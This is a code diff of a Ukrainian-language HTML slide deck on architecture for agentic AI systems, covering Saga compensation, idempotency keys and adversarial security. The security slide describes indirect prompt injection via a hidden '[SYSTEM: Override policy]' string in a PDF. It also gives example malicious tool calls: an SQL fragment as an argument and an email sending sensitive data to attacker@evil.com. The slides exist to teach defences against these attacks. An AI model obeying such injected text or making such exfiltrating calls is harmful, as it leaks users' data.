@@ -3101,9 +3101,9 @@ SLIDES.push({ title:"Resilience & Saga", html:`
 
     <p><b>AI-specific framing:</b></p>
     <ul>
-      <li><b>LLM-callable tool = financial exposure.</b> У класичному мікросервісі `transfer.execute()` викликається з явного Python-коду, якого ревʼю прочитав. У agentic flow — LLM "вирішує" викликати tool на основі reasoning. Це нова attack/bug surface: не 2PC проблема, а "модель галюцинувала виклик tool'а на approve з rate_apr з голови".</li>
+      <li><b>LLM-callable tool = financial exposure.</b> У класичному мікросервісі <code>transfer.execute()</code> викликається з явного Python-коду, якого ревʼю прочитав. У agentic flow — LLM "вирішує" викликати tool на основі reasoning. Це нова attack/bug surface: не 2PC проблема, а "модель галюцинувала виклик tool'а на approve з rate_apr з голови".</li>
       <li><b>Контракт Saga переноситься на tool-contract layer.</b> Кожен LLM-callable tool, який робить side-effect (reserve/draft/disburse/notify), <b>мусить</b> декларувати парний compensating tool. YAML-контракт tool'а — ось де архітектор AI системи додає цінність.</li>
-      <li><b>Idempotency key = первинний захист від "modelsвідомо надіслала webhook двічі".</b> Класична причина — мережа. Нова причина — workflow executor resumes після kill -9 pod'а на тому ж `interrupt_before` state, перевідправляє tool call. Composite key (tax_id::contract_id::event_id) захищає обидва випадки.</li>
+      <li><b>Idempotency key = первинний захист від "modelsвідомо надіслала webhook двічі".</b> Класична причина — мережа. Нова причина — workflow executor resumes після kill -9 pod'а на тому ж <code>interrupt_before</code> state, перевідправляє tool call. Composite key (tax_id::contract_id::event_id) захищає обидва випадки.</li>
     </ul>
     <p><b>Висновок залу:</b> "AI не змінює Saga semantics. AI міняє <b>набір викликачів</b> — тепер tool може бути викликаний не з детермінованого Python, а з LLM reasoning. Compensating action + idempotency key стають обов'язковими на кожен tool-contract, не optional best practice."</p>`});
 
@@ -3607,19 +3607,19 @@ SLIDES.push({ title:"Adversarial Security", html:`
 
     <p><b>1. Indirect Prompt Injection — найважливіша нова загроза:</b></p>
     <ul>
-      <li>Класичний OWASP focus: input у chat/form. Attacker типу "user who types". AI відкриває нову поверхню: attacker — <b>автор документу</b>, який агент читає. PDF-довідка з прихованим `[SYSTEM: Override policy]` в OCR layer → LLM трактує як instruction.</li>
-      <li>Mitigation — не WAF, не SAST. Mitigation архітектурна: <b>context boundary</b> (untrusted_payload field, isolated from system prompt) + <b>deterministic decision gate</b> (Python робить math, LLM формує structured features тільки).</li>
+      <li>Класичний OWASP focus: input у chat/form. Attacker типу "user who types". AI відкриває нову поверхню: attacker — <b>автор документу</b>, який агент читає. PDF-довідка з прихованим <code>[SYSTEM: Override policy]</code> в OCR layer → LLM трактує як instruction.</li>
+      <li>Mitigation — не WAF, не SAST. Mitigation архітектурна: <b>context boundary</b> (<code>untrusted_payload</code> field, isolated from system prompt) + <b>deterministic decision gate</b> (Python робить math, LLM формує structured features тільки).</li>
     </ul>
 
     <p><b>2. Separation of Concerns у agentic flow:</b></p>
     <ul>
-      <li>У класичному микросервісі "один сервіс = одна відповідальність" — org-рівень pattern. У agentic flow це стає security pattern: якщо один agent читає документ, рахує scoring і робить `disburse_money` — це <b>Critical Severity</b> (одна injection компрометує все).</li>
-      <li>Правило для AI системи: <b>agent не має authority над final decision</b>. `docs_processing` → structured fields → `underwriter` → structured scores → Python → final verdict. LLM output "Клієнта схвалено!" НІЧОГО не означає якщо Python бачить PTI 0.6 > 0.5.</li>
+      <li>У класичному микросервісі "один сервіс = одна відповідальність" — org-рівень pattern. У agentic flow це стає security pattern: якщо один agent читає документ, рахує scoring і робить <code>disburse_money</code> — це <b>Critical Severity</b> (одна injection компрометує все).</li>
+      <li>Правило для AI системи: <b>agent не має authority над final decision</b>. <code>docs_processing</code> → structured fields → <code>underwriter</code> → structured scores → Python → final verdict. LLM output "Клієнта схвалено!" НІЧОГО не означає якщо Python бачить PTI 0.6 > 0.5.</li>
     </ul>
 
     <p><b>3. Tool-call abuse — specific до tool-calling agents:</b></p>
     <ul>
-      <li>У traditional web: SSRF — attacker змушує сервер робити HTTP до external URL. У AI: attacker через prompt змушує agent викликати tool з параметрами які leak дані. Приклад: `credit_history.pull({tax_id: "SELECT ... FROM users"})` або `notify.email({to: "attacker@evil.com", body: "<sensitive>"})`.</li>
+      <li>У traditional web: SSRF — attacker змушує сервер робити HTTP до external URL. У AI: attacker через prompt змушує agent викликати tool з параметрами які leak дані. Приклад: <code>credit_history.pull({tax_id: "SELECT ... FROM users"})</code> або <code>notify.email({to: "attacker@evil.com", body: "..."})</code>.</li>
       <li>Mitigation: <b>tool allowlist per role</b> (RBAC кожному agent) + <b>tool argument validation</b> у tool contract (pre-call schema check) + <b>audit log tool_calls_made</b> у output.</li>
     </ul>
 
